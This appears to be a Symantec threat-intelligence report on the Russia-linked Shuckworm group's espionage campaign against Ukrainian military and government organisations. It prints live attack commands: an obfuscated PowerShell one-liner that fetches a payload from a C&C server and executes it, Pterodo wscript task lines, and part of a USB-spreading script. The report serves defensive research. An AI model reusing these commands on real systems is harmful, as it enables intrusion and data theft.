Shuckworm: Inside Russia’s Relentless Cyber Campaign Against
Ukraine
Attackers heavily focused on acquiring military and security
intelligence in order to support invading forces.
The Shuckworm espionage group is continuing to mount multiple cyber attacks against Ukraine, with recent targets
including security services, military, and government organizations.
In some cases, Shuckworm has succeeded in staging long-running intrusions, lasting for as long as three months.
The attackers repeatedly attempted to access and steal sensitive information such as reports about the deaths of
Ukrainian military service members, enemy engagements and air strikes, arsenal inventories, military training, and
more.
In a bid to stay ahead of detection, Shuckworm has repeatedly refreshed its toolset, rolling out new versions of
known tools and short-lived infrastructure, along with new additions, such as USB propagation malware.
Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its
operations on Ukraine since it first appeared in 2014. Ukrainian officials have publicly stated that the group
operates on behalf of the Russian Federal Security Service (FSB).
Shuckworm tactics, techniques, and procedures
Shuckworm is known to use phishing emails as an initial infection vector, in order to gain access to victim machines
and distribute malware. The attackers send emails with malicious attachments to Ukrainian victims, with the
attachments of various file types, such as:
2/10
.docx
.rar (RAR archive files)
.sfx (self-extracting archives)
.lnk
.hta (HTML smuggling files)
The victim lures we observed related to armed conflicts, criminal proceedings, combating crime, and protection of
children, among others.
Once victims were infected, the attackers then proceed to download additional backdoors and tools onto targeted
machines.
Shuckworm has also been observed using a new PowerShell script in order to spread its custom backdoor
malware, Pterodo, via USB. Researchers from Symantec, part of Broadcom, blogged about Backdoor.Pterodo in
April 2022, documenting how we had found four variants of the backdoor with similar functionality. The variants are
Visual Basic Script (VBS) droppers that will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to maintain
persistence, and download additional code from a command-and-control (C&C) server.
Examples of recent scheduled tasks include execution of the following command lines:
CSIDL_SYSTEM\wscript.exe "CSIDL_PROFILE\appdata\local\temp\desert" //e:vbscript //b /dmc /j2k /spl /nff
CSIDL_SYSTEM\wscript.exe "CSIDL_PROFILE\favorites\jumper.asf" //e:vbscript //b /asf /mdf /nab /apk
wscript.exe "C:\Users\[REDACTED]\Contacts\delightful.abk" //e:vbscript //b /cfg /mdm /cfm /mp4
The new PowerShell script is used to first copy itself onto the infected machine and create a shortcut file using an
rtk.lnk extension. The script uses file names such as “porn_video.rtf.lnk”, “do_not_delete.rtf.lnk”” and
“evidence.rtf.lnk” in an attempt to entice individuals to open the files. These file names are generally in Ukrainian,
but some are also in English.
Next, the script enumerates all drives, copying itself to any available removable disks – USB drives. These USB
drives are likely used by the attackers for lateral movement across victim networks and may be used to help the
attackers reach air-gapped machines within targeted organizations.
In this recent activity, we also observed the group leveraging legitimate services to act as C&C servers, including
using the Telegram messaging service for its C&C infrastructure. More recently, they have also used Telegram’s
micro-blogging platform, called Telegraph, to store C&C addresses.
Figure 1. Threat actors use Telegraph to store C&C addresses
Shuckworm tends to only use its C&C infrastructure for short periods of time, limiting the usefulness of its C&Cs
when it comes to finding more activity or linking activity together. However, the group does use SSL certificates that
have some commonalities that may be leveraged for tracking purposes. We believe the group is likely leveraging
pre-configured images for use in its C&C deployment. These data points can help researchers to identify additional
C&C infrastructure and Shuckworm activity.

Symantec also saw what was likely Giddome, an infostealer tool that is a known Shuckworm backdoor, deployed
onto victim networks to steal and exfiltrate data of interest.
Typical Attack Chain
The following describes a typical attack chain seen on a victim machine compromised by Shuckworm in this
campaign.
In one attack, the first sign of malicious activity was when the user appeared to open a RAR archive file that was
likely delivered via a spear-phishing email and which contained a malicious document.
After the document was opened, a malicious PowerShell command was observed being executed to download the
next-stage payload from the attackers’ C&C server:
"CSIDL_SYSTEM\cmd.exe" /c start /min "" powershell -w hidden "$gt='/get.'+[char]
(56+56)+[char](104)+[char](112);$hosta=[char](50+48);
[system.net.servicepointmanager]::servercertificatevalidationcallback=
{$true};$hosta+='.vafikgo.';$hosta+=[char](57+57);$hosta+=[char](60+57);$addrs=
[system.net.dns]::gethostbyname($hosta);$addr=$addrs.addresslist[0];$client=(new-
object
net.webclient);$faddr='htt'+'ps://'+$addr+$gt;$text=$client.downloadstring($faddr);iex
$text"
More recently, Symantec has observed Shuckworm leveraging more IP addresses in their PowerShell scripts. This
is likely an attempt to evade some tracking methods employed by researchers.
Shuckworm also continues to update the obfuscation techniques used in its PowerShell scripts in an attempt to
avoid detection, with up to 25 new variants of the group’s scripts observed per month between January and April
2023.
Next, a VBS script, which was Shuckworm’s Pterodo backdoor, was executed:
CSIDL_SYSTEM\wscript.exe CSIDL_PROFILE\appdata\local\temp\deprive.wow //e:vbscript //b /kmc /fff /cfm
/sc4model
Following this, we saw what appeared to be multiple similar scripts being executed. The machine used for this
activity appeared to contain multiple confidential documents related to Ukrainian security services or government
departments.
On a different machine, we saw malicious activity that appeared to be executed from a file (foto.safe) that had been
dropped by an infected USB key that someone had plugged into the system. Symantec observed multiple file paths
present on infected machines that indicate users had plugged in an infected USB key e.g. "usb-накопитель"
translates as "usb-drive".
The foto.safe file is a Base64-encoded script.
Decoded it looks like the following:
fUNCtIon sET-lnK ($chILd) {
$nAMetxt = "foto.sAfe".TolowER();
$NAmE = ("кОМПРОМат", "КОРЗиНА", "СеКРетнО" | GeT-rAnDOm).ToUPPeR();

This PowerShell script is used to copy itself onto the infected machine and then create a shortcut file that links to
the PowerShell script. Symantec has identified multiple variants of this script that can be used to indicate
successful infection, or to download additional tools onto infected machines. 
Victims
One of the most significant things about this campaign is the targets, which include Ukrainian military, security,
research, and government organizations. The attackers were observed focusing on machines that contained what
appeared from file names to be sensitive military information that may be abused to support Russian kinetic war
efforts.   
The majority of these attacks began in February/March 2023, with the attackers maintaining a presence on some of
the victim machines until May. The sectors and nature of the organizations and machines targeted may have given
the attackers access to significant amounts of sensitive information. There were indications in some organizations
that the attackers were on the machines of the organizations’ human resources departments, indicating that
information about individuals working at the various organizations was a priority for the attackers, among other
things.
This activity demonstrates that Shuckworm’s relentless focus on Ukraine continues. It seems clear that Russian
nation-state-backed attack groups continue to prioritize high-value Ukrainian targets in attempts to find data that
may potentially help their military operations.
